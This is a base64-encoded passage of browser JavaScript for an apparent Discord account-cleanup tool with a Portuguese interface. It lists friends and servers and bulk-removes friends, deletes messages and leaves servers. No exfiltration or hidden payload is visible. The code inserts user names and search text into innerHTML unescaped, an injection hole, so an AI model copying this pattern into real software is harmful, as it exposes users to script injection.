IGNsYXNzPSJkZm0tYnRuIGRhbmdlciIgaWQ9ImNvbmZpcm0iPkNvbmZpcm1hcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIGA7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChtb2RhbCk7CgogICAgICAgIG1vZGFsLnF1ZXJ5U2VsZWN0b3IoJyNjYW5jZWwnKS5vbmNsaWNrID0gKCkgPT4gbW9kYWwucmVtb3ZlKCk7CiAgICAgICAgbW9kYWwucXVlcnlTZWxlY3RvcignI2NvbmZpcm0nKS5vbmNsaWNrID0gKCkgPT4gewogICAgICAgICAgICBtb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgb25Db25maXJtKCk7CiAgICAgICAgfTsKCiAgICAgICAgbW9kYWwuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoZSkgPT4gewogICAgICAgICAgICBpZiAoZS50YXJnZXQgPT09IG1vZGFsKSBtb2RhbC5yZW1vdmUoKTsKICAgICAgICB9KTsKICAgIH07CgogICAgY29uc3QgZmlsdGVySXRlbXMgPSAoaXRlbXMsIHNlYXJjaFRlcm0pID0+IHsKICAgICAgICBpZiAoIXNlYXJjaFRlcm0pIHJldHVybiBpdGVtczsKICAgICAgICByZXR1cm4gaXRlbXMuZmlsdGVyKGl0ZW0gPT4gaXRlbS5uYW1lLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoc2VhcmNoVGVybS50b0xvd2VyQ2FzZSgpKSk7CiAgICB9OwoKICAgIGNvbnN0IHJlbmRlckZyaWVuZHMgPSAoZnJpZW5kcywgc2VhcmNoVGVybSA9ICcnKSA9PiB7CiAgICAgICAgY29uc3QgY29udGVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmcmllbmRzLXRhYicpOwogICAgICAgIGNvbnN0IGZpbHRlcmVkRnJpZW5kcyA9IGZpbHRlckl0ZW1zKGZyaWVuZHMubWFwKGYgPT4gKHsgLi4uZiwgbmFtZTogZi51c2VyLmdsb2JhbF9uYW1lIHx8IGYudXNlci51c2VybmFtZSB9KSksIHNlYXJjaFRlcm0pOwoKICAgICAgICBpZiAoIWZpbHRlcmVkRnJpZW5kcy5sZW5ndGgpIHsKICAgICAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VhcmNoLWNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJkZm0tc2VhcmNoIiBpZD0iZnJpZW5kcy1zZWFyY2giIHBsYWNlaG9sZGVyPSJCdXNjYXIgYW1pZ29zLi4uIiB2YWx1ZT0iJHtzZWFyY2hUZXJtfSI+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1lbXB0eSI+JHtzZWFyY2hUZXJtID8gJ05lbmh1bSBhbWlnbyBlbmNvbnRyYWRvJyA6ICdOZW5odW0gYW1pZ28nfTwvZGl2PgogICAgICAgICAgICBgOwogICAgICAgICAgICBpZiAoc2VhcmNoVGVybSkgewogICAgICAgICAgICAgICAgY29udGVudC5xdWVyeVNlbGVjdG9yKCcjZnJpZW5kcy1zZWFyY2gnKS5hZGRFdmVudExpc3RlbmVyKCdpbnB1dCcsIChlKSA9PiByZW5kZXJGcmllbmRzKGZyaWVuZHMsIGUudGFyZ2V0LnZhbHVlKSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9ImZyaWVuZHMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIGFtaWdvcy4uLiIgdmFsdWU9IiR7c2VhcmNoVGVybX0iPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWFjdGlvbnMiPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biBzZWNvbmRhcnkiIGlkPSJyZWZyZXNoLWZyaWVuZHMiPkF0dWFsaXphcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biIgaWQ9InJlbW92ZS1zZWxlY3RlZC1mcmllbmRzIj5SZW1vdmVyIFNlbGVjaW9uYWRvczwvYnV0dG9uPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biBkYW5nZXIiIGlkPSJyZW1vdmUtYWxsLWZyaWVuZHMiPlJlbW92ZXIgVG9kb3M8L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICR7ZmlsdGVyZWRGcmllbmRzLm1hcChmID0+IGAKICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1mcmllbmQiIGRhdGEtaWQ9IiR7Zi5pZH0iIGRhdGEtbmFtZT0iJHtmLnVzZXIuZ2xvYmFsX25hbWUgfHwgZi51c2VyLnVzZXJuYW1lfSIgZGF0YS1hdmF0YXI9Imh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJHtmLmlkfS8ke2YudXNlci5hdmF0YXJ9LnBuZyI+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImNoZWNrYm94IiBjbGFzcz0iZGZtLWNoZWNrYm94Ij4KICAgICAgICAgICAgICAgICAgICA8aW1nIGNsYXNzPSJkZm0tYXZhdGFyIiBzcmM9Imh0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJHtmLmlkfS8ke2YudXNlci5hdmF0YXJ9LnBuZyIgb25lcnJvcj0idGhpcy5zcmM9J2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2VtYmVkL2F2YXRhcnMvMC5wbmcnIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0taW5mbyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1uYW1lIj4ke2YudXNlci5nbG9iYWxfbmFtZSB8fCBmLnVzZXIudXNlcm5hbWV9PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLWZyaWVuZC1hY3Rpb25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWRlbGV0ZS1tZXNzYWdlcyI+QXBhZ2FyIE1zZ3M8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLXJlbW92ZSI+UmVtb3ZlcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIGApLmpvaW4oJycpfQogICAgICAgIGA7CgogICAgICAgIGNvbnN0IHNlYXJjaElucHV0ID0gY29udGVudC5xdWVyeVNlbGVjdG9yKCcjZnJpZW5kcy1zZWFyY2gnKTsKICAgICAgICBsZXQgc2VhcmNoVGltZW91dDsKCiAgICAgICAgc2VhcmNoSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcignaW5wdXQnLCAoZSkgPT4gewogICAgICAgICAgICBjbGVhclRpbWVvdXQoc2VhcmNoVGltZW91dCk7CiAgICAgICAgICAgIHNlYXJjaFRpbWVvdXQgPSBzZXRUaW1lb3V0KCgpID0+IHJlbmRlckZyaWVuZHMoZnJpZW5kcywgZS50YXJnZXQudmFsdWUpLCAzMDApOwogICAgICAgIH0pOwoKICAgICAgICBzZWFyY2hJbnB1dC5hZGRFdmVudExpc3RlbmVyKCdrZXlwcmVzcycsIChlKSA9PiB7CiAgICAgICAgICAgIGlmIChlLmtleSA9PT0gJ0VudGVyJykgewogICAgICAgICAgICAgICAgY2xlYXJUaW1lb3V0KHNlYXJjaFRpbWVvdXQpOwogICAgICAgICAgICAgICAgcmVuZGVyRnJpZW5kcyhmcmllbmRzLCBlLnRhcmdldC52YWx1ZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKCiAgICAgICAgY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCcuZGZtLWNoZWNrYm94JykuZm9yRWFjaChjaGVja2JveCA9PiB7CiAgICAgICAgICAgIGNoZWNrYm94LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIChlKSA9PiB7CiAgICAgICAgICAgICAgICBlLnRhcmdldC5jbG9zZXN0KCcuZGZtLWZyaWVuZCcpLmNsYXNzTGlzdC50b2dnbGUoJ3NlbGVjdGVkJywgZS50YXJnZXQuY2hlY2tlZCk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwoKICAgICAgICBjb250ZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5kZm0tZGVsZXRlLW1lc3NhZ2VzJykuZm9yRWFjaChidG4gPT4gewogICAgICAgICAgICBidG4ub25jbGljayA9IChlKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zdCBlbCA9IGUudGFyZ2V0LmNsb3Nlc3QoJy5kZm0tZnJpZW5kJyk7CiAgICAgICAgICAgICAgICBkZWxldGVBbGxNZXNzYWdlcyhlbC5kYXRhc2V0LmlkLCBlbC5kYXRhc2V0Lm5hbWUpOwogICAgICAgICAgICB9OwogICAgICAgIH0pOwoKICAgICAgICBjb250ZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5kZm0tcmVtb3ZlJykuZm9yRWFjaChidG4gPT4gewogICAgICAgICAgICBidG4ub25jbGljayA9IGFzeW5jIChlKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zdCBlbCA9IGUudGFyZ2V0LmNsb3Nlc3QoJy5kZm0tZnJpZW5kJyk7CiAgICAgICAgICAgICAgICBjb25zdCBidXR0b24gPSBlLnRhcmdldDsKICAgICAgICAgICAgICAgIGJ1dHRvbi5kaXNhYmxlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBidXR0b24udGV4dENvbnRlbnQgPSAnUmVtb3ZlbmRvLi4uJzsKICAgICAgICAgICAgICAgIGF3YWl0IHJlbW92ZUZyaWVuZChlbC5kYXRhc2V0LmlkLCBlbC5kYXRhc2V0Lm5hbWUsIGVsLmRhdGFzZXQuYXZhdGFyKTsKICAgICAgICAgICAgICAgIGVsLnJlbW92ZSgpOwogICAgICAgICAgICB9OwogICAgICAgIH0pOwoKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVmcmVzaC1mcmllbmRzJykub25jbGljayA9IGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3QgYnRuID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlZnJlc2gtZnJpZW5kcycpOwogICAgICAgICAgICBidG4uZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICBidG4udGV4dENvbnRlbnQgPSAnQXR1YWxpemFuZG8uLi4nOwogICAgICAgICAgICBjb25zdCBmcmllbmRzRGF0YSA9IGF3YWl0IGZldGNoRnJpZW5kcygpOwogICAgICAgICAgICByZW5kZXJGcmllbmRzKGZyaWVuZHNEYXRhLmZpbHRlcihmID0+IGYudHlwZSA9PT0gMSksIHNlYXJjaElucHV0LnZhbHVlKTsKICAgICAgICAgICAgYnRuLmRpc2FibGVkID0gZmFsc2U7CiAgICAgICAgICAgIGJ0bi50ZXh0Q29udGVudCA9ICdBdHVhbGl6YXInOwogICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCdMaXN0YSBhdHVhbGl6YWRhIScsICdzdWNjZXNzJyk7CiAgICAgICAgfTsKCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlbW92ZS1zZWxlY3RlZC1mcmllbmRzJykub25jbGljayA9IGFzeW5jICgpID0+IHsKICAgICAgICAgICAgY29uc3Qgc2VsZWN0ZWQgPSBBcnJheS5mcm9tKGNvbnRlbnQucXVlcnlTZWxlY3RvckFsbCgnLmRmbS1mcmllbmQuc2VsZWN0ZWQnKSk7CiAgICAgICAgICAgIGlmICghc2VsZWN0ZWQubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCdTZWxlY2lvbmUgcGVsbyBtZW5vcyB1bSBhbWlnbyEnLCAnd2FybmluZycpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CgogICAgICAgICAgICBzaG93Q29uZmlybU1vZGFsKGBSZW1vdmVyICR7c2VsZWN0ZWQubGVuZ3RofSBhbWlnbyhzKT9gLCBhc3luYyAoKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zdCB7IG1vZGFsOiBwcm9ncmVzc01vZGFsLCBzdGF0ZTogY2FuY2VsU3RhdGUgfSA9IGNyZWF0ZVByb2dyZXNzTW9kYWwoJ1JlbW92ZW5kbyBBbWlnb3MnLCBzZWxlY3RlZC5sZW5ndGgpOwogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwcm9ncmVzc01vZGFsKTsKICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzVGV4dCA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcignI3Byb2dyZXNzLXRleHQnKTsKICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCcjcHJvZ3Jlc3MtYmFyJyk7CiAgICAgICAgICAgICAgICBsZXQgcmVtb3ZlZENvdW50ID0gMDsKCiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IHNlbGVjdGVkLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgYnJlYWs7CiAgICAgICAgICAgICAgICAgICAgY29uc3QgZWwgPSBzZWxlY3RlZFtpXTsKICAgICAgICAgICAgICAgICAgICBhd2FpdCByZW1vdmVGcmllbmQoZWwuZGF0YXNldC5pZCwgZWwuZGF0YXNldC5uYW1lLCBlbC5kYXRhc2V0LmF2YXRhcik7CiAgICAgICAgICAgICAgICAgICAgZWwucmVtb3ZlKCk7CiAgICAgICAgICAgICAgICAgICAgcmVtb3ZlZENvdW50Kys7CiAgICAgICAgICAgICAgICAgICAgdXBkYXRlUHJvZ3Jlc3MocHJvZ3Jlc3NUZXh0LCBwcm9ncmVzc0JhciwgaSArIDEsIHNlbGVjdGVkLmxlbmd0aCwgJ2FtaWdvcycpOwogICAgICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgewogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYENhbmNlbGFkbyEgJHtyZW1vdmVkQ291bnR9IGFtaWdvcyBmb3JhbSByZW1vdmlkb3MuYCwgJ3dhcm5pbmcnKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbihgJHtzZWxlY3RlZC5sZW5ndGh9IGFtaWdvcyByZW1vdmlkb3MhYCwgJ3N1Y2Nlc3MnKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSk7CiAgICAgICAgfTsKCiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3JlbW92ZS1hbGwtZnJpZW5kcycpLm9uY2xpY2sgPSBhc3luYyAoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGFsbEZyaWVuZHMgPSBBcnJheS5mcm9tKGNvbnRlbnQucXVlcnlTZWxlY3RvckFsbCgnLmRmbS1mcmllbmQnKSk7CiAgICAgICAgICAgIGlmICghYWxsRnJpZW5kcy5sZW5ndGgpIHsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oJ05lbmh1bSBhbWlnbyBwYXJhIHJlbW92ZXIhJywgJ3dhcm5pbmcnKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgc2hvd0NvbmZpcm1Nb2RhbChgQVRFTsOHw4NPISBSZW1vdmVyIFRPRE9TIG9zICR7YWxsRnJpZW5kcy5sZW5ndGh9IGFtaWdvcz88YnI+PGJyPkVzdGEgYcOnw6NvIG7Do28gcG9kZSBzZXIgZGVzZmVpdGEhYCwgYXN5bmMgKCkgPT4gewogICAgICAgICAgICAgICAgY29uc3QgeyBtb2RhbDogcHJvZ3Jlc3NNb2RhbCwgc3RhdGU6IGNhbmNlbFN0YXRlIH0gPSBjcmVhdGVQcm9ncmVzc01vZGFsKCdSZW1vdmVuZG8gQW1pZ29zJywgYWxsRnJpZW5kcy5sZW5ndGgpOwogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwcm9ncmVzc01vZGFsKTsKICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzVGV4dCA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcignI3Byb2dyZXNzLXRleHQnKTsKICAgICAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCcjcHJvZ3Jlc3MtYmFyJyk7CiAgICAgICAgICAgICAgICBsZXQgcmVtb3ZlZENvdW50ID0gMDsKCiAgICAgICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGFsbEZyaWVuZHMubGVuZ3RoOyBpKyspIHsKICAgICAgICAgICAgICAgICAgICBpZiAoY2FuY2VsU3RhdGUuY2FuY2VsbGVkKSBicmVhazsKICAgICAgICAgICAgICAgICAgICBjb25zdCBlbCA9IGFsbEZyaWVuZHNbaV07CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgcmVtb3ZlRnJpZW5kKGVsLmRhdGFzZXQuaWQsIGVsLmRhdGFzZXQubmFtZSwgZWwuZGF0YXNldC5hdmF0YXIpOwogICAgICAgICAgICAgICAgICAgIGVsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgICAgIHJlbW92ZWRDb3VudCsrOwogICAgICAgICAgICAgICAgICAgIHVwZGF0ZVByb2dyZXNzKHByb2dyZXNzVGV4dCwgcHJvZ3Jlc3NCYXIsIGkgKyAxLCBhbGxGcmllbmRzLmxlbmd0aCwgJ2FtaWdvcycpOwogICAgICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgewogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYENhbmNlbGFkbyEgJHtyZW1vdmVkQ291bnR9IGFtaWdvcyBmb3JhbSByZW1vdmlkb3MuYCwgJ3dhcm5pbmcnKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9ImZyaWVuZHMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIGFtaWdvcy4uLiI+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tZW1wdHkiPk5lbmh1bSBhbWlnbzwvZGl2PgogICAgICAgICAgICAgICAgICAgIGA7CiAgICAgICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbignVG9kb3Mgb3MgYW1pZ29zIHJlbW92aWRvcyEnLCAnc3VjY2VzcycpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9KTsKICAgICAgICB9OwogICAgfTsKCiAgICBjb25zdCByZW5kZXJTZXJ2ZXJzID0gKHNlcnZlcnMsIHNlYXJjaFRlcm0gPSAnJykgPT4gewogICAgICAgIGNvbnN0IGNvbnRlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2VydmVycy10YWInKTsKICAgICAgICBjb25zdCBmaWx0ZXJlZFNlcnZlcnMgPSBzZXJ2ZXJzLmZpbHRlcihzID0+ICFzLm93bmVyKTsKICAgICAgICBjb25zdCBmaWx0ZXJlZEFuZFNlYXJjaGVkID0gZmlsdGVySXRlbXMoZmlsdGVyZWRTZXJ2ZXJzLCBzZWFyY2hUZXJtKTsKCiAgICAgICAgaWYgKCFmaWx0ZXJlZEFuZFNlYXJjaGVkLmxlbmd0aCkgewogICAgICAgICAgICBjb250ZW50LmlubmVySFRNTCA9IGAKICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImRmbS1zZWFyY2giIGlkPSJzZXJ2ZXJzLXNlYXJjaCIgcGxhY2Vob2xkZXI9IkJ1c2NhciBzZXJ2aWRvcmVzLi4uIiB2YWx1ZT0iJHtzZWFyY2hUZXJtfSI+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1lbXB0eSI+JHtzZWFyY2hUZXJtID8gJ05lbmh1bSBzZXJ2aWRvciBlbmNvbnRyYWRvJyA6ICdOZW5odW0gc2Vydmlkb3InfTwvZGl2PgogICAgICAgICAgICBgOwogICAgICAgICAgICBpZiAoc2VhcmNoVGVybSkgewogICAgICAgICAgICAgICAgY29udGVudC5xdWVyeVNlbGVjdG9yKCcjc2VydmVycy1zZWFyY2gnKS5hZGRFdmVudExpc3RlbmVyKCdpbnB1dCcsIChlKSA9PiByZW5kZXJTZXJ2ZXJzKHNlcnZlcnMsIGUudGFyZ2V0LnZhbHVlKSk7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgY29udGVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1zZWFyY2gtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBjbGFzcz0iZGZtLXNlYXJjaCIgaWQ9InNlcnZlcnMtc2VhcmNoIiBwbGFjZWhvbGRlcj0iQnVzY2FyIHNlcnZpZG9yZXMuLi4iIHZhbHVlPSIke3NlYXJjaFRlcm19Ij4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1hY3Rpb25zIj4KICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4gc2Vjb25kYXJ5IiBpZD0icmVmcmVzaC1zZXJ2ZXJzIj5BdHVhbGl6YXI8L2J1dHRvbj4KICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4iIGlkPSJsZWF2ZS1zZWxlY3RlZC1zZXJ2ZXJzIj5TYWlyIFNlbGVjaW9uYWRvczwvYnV0dG9uPgogICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0biBkYW5nZXIiIGlkPSJsZWF2ZS1hbGwtc2VydmVycyI+U2FpciBkZSBUb2RvczwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgJHtmaWx0ZXJlZEFuZFNlYXJjaGVkLm1hcChzID0+IHsKICAgICAgICAgICAgICAgIGNvbnN0IGljb25VcmwgPSBzLmljb24gPyBgaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vaWNvbnMvJHtzLmlkfS8ke3MuaWNvbn0ucG5nYCA6ICdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9lbWJlZC9hdmF0YXJzLzAucG5nJzsKICAgICAgICAgICAgICAgIHJldHVybiBgCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNlcnZlciIgZGF0YS1pZD0iJHtzLmlkfSIgZGF0YS1uYW1lPSIke3MubmFtZX0iIGRhdGEtaWNvbj0iJHtpY29uVXJsfSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgY2xhc3M9ImRmbS1jaGVja2JveCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgY2xhc3M9ImRmbS1zZXJ2ZXItaWNvbiIgc3JjPSIke2ljb25Vcmx9IiBvbmVycm9yPSJ0aGlzLnNyYz0naHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vZW1iZWQvYXZhdGFycy8wLnBuZyciPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0taW5mbyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbmFtZSI+JHtzLm5hbWV9PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2VydmVyLWFjdGlvbnMiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWxlYXZlLXNlcnZlciI+U2FpcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIGA7CiAgICAgICAgICAgIH0pLmpvaW4oJycpfQogICAgICAgIGA7CgogICAgICAgIGNvbnN0IHNlYXJjaElucHV0ID0gY29udGVudC5xdWVyeVNlbGVjdG9yKCcjc2VydmVycy1zZWFyY2gnKTsKICAgICAgICBsZXQgc2VhcmNoVGltZW91dDsKCiAgICAgICAgc2VhcmNoSW5wdXQuYWRkRXZlbnRMaXN0ZW5lcignaW5wdXQnLCAoZSkgPT4gewogICAgICAgICAgICBjbGVhclRpbWVvdXQoc2VhcmNoVGltZW91dCk7CiAgICAgICAgICAgIHNlYXJjaFRpbWVvdXQgPSBzZXRUaW1lb3V0KCgpID0+IHJlbmRlclNlcnZlcnMoc2VydmVycywgZS50YXJnZXQudmFsdWUpLCAzMDApOwogICAgICAgIH0pOwoKICAgICAgICBzZWFyY2hJbnB1dC5hZGRFdmVudExpc3RlbmVyKCdrZXlwcmVzcycsIChlKSA9PiB7CiAgICAgICAgICAgIGlmIChlLmtleSA9PT0gJ0VudGVyJykgewogICAgICAgICAgICAgICAgY2xlYXJUaW1lb3V0KHNlYXJjaFRpbWVvdXQpOwogICAgICAgICAgICAgICAgcmVuZGVyU2VydmVycyhzZXJ2ZXJzLCBlLnRhcmdldC52YWx1ZSk7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKCiAgICAgICAgY29udGVudC5xdWVyeVNlbGVjdG9yQWxsKCcuZGZtLWNoZWNrYm94JykuZm9yRWFjaChjaGVja2JveCA9PiB7CiAgICAgICAgICAgIGNoZWNrYm94LmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIChlKSA9PiB7CiAgICAgICAgICAgICAgICBlLnRhcmdldC5jbG9zZXN0KCcuZGZtLXNlcnZlcicpLmNsYXNzTGlzdC50b2dnbGUoJ3NlbGVjdGVkJywgZS50YXJnZXQuY2hlY2tlZCk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwoKICAgICAgICBjb250ZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJy5kZm0tbGVhdmUtc2VydmVyJykuZm9yRWFjaChidG4gPT4gewogICAgICAgICAgICBidG4ub25jbGljayA9IGFzeW5jIChlKSA9PiB7CiAgICAgICAgICAgICAgICBjb25zdCBlbCA9IGUudGFyZ2V0LmNsb3Nlc3QoJy5kZm0tc2VydmVyJyk7CiAgICAgICAgICAgICAgICBjb25zdCBidXR0b24gPSBlLnRhcmdldDsKICAgICAgICAgICAgICAgIGJ1dHRvbi5kaXNhYmxlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBidXR0b24udGV4dENvbnRlbnQgPSAnU2FpbmRvLi4uJzsKICAgICAgICAgICAgICAgIGF3YWl0IGxlYXZlU2VydmVyKGVsLmRhdGFzZXQuaWQsIGVsLmRhdGFzZXQubmFtZSwgZWwuZGF0YXNldC5pY29uKTsKICAgICAgICAgICAgICAgIGVsLnJlbW92ZSgpOwogICAgICAgICAgICB9OwogICAgICAgIH0pOwoKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVmcmVzaC1zZX